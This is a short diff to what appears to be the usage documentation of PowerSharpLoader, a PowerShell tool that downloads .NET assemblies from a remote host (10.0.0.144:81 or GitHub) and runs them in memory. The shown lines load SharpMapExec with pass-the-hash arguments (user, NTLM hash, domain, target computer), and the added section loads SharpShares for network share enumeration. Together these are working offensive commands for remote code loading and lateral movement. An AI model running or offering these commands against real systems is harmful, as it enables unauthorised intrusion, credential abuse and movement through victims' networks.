@@ -50,4 +50,8 @@ Invoke-LoadAssembly -AssemblyUrl https://github.com/F4l13n5n0w/PowerSharpLoader/
 Invoke-LoadAssembly -AssemblyUrl http://10.0.0.144:81/SharpMapExec.exe -Command "ntlm smb /user:USER /ntlm:HASH /domain:DOMAIN /computername:TARGET"
 Invoke-LoadAssembly -AssemblyUrl https://github.com/F4l13n5n0w/PowerSharpLoader/blob/master/x64/SharpMapExec.exe?raw=true -Command "ntlm smb /user:USER /ntlm:HASH /domain:DOMAIN /computername:TARGET"
 
+## Load SharpShares
+Invoke-LoadAssembly -AssemblyUrl http://10.0.0.144:81/SharpShares.exe -Command "-h"
+Invoke-LoadAssembly -AssemblyUrl https://github.com/F4l13n5n0w/PowerSharpLoader/blob/master/x64/SharpShares.exe?raw=true -Command "-h"
+
 ```
